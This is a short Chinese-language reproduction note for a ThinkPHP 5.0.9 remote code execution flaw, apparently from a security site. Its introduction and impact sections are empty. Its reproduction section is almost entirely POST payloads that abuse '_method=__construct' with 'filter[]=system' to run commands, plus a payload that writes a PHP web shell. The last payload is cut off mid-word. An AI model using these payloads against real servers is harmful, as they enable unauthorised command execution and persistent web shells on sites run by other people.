Thinkphp 5.0.9
==============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

> www.0-sec.org/?s=index/index

    POST

    s=whoami&_method=__construct&method=POST&filter[]=system
    aaaa=whoami&_method=__construct&method=GET&filter[]=system
    _method=__construct&method=GET&filter[]=system&get[]=whoami
    c=system&f=calc&_method=filter

> 写shell

    POST

    s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=asser
